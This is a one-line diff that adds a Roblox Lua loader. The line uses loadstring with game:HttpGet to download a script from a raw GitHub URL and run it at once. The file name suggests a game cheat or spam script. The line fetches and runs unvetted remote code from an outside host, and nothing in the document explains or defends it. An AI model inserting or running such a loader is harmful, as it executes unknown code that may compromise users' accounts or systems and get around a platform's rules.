@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam1-u4i82qwxgd58f2.lua"))()
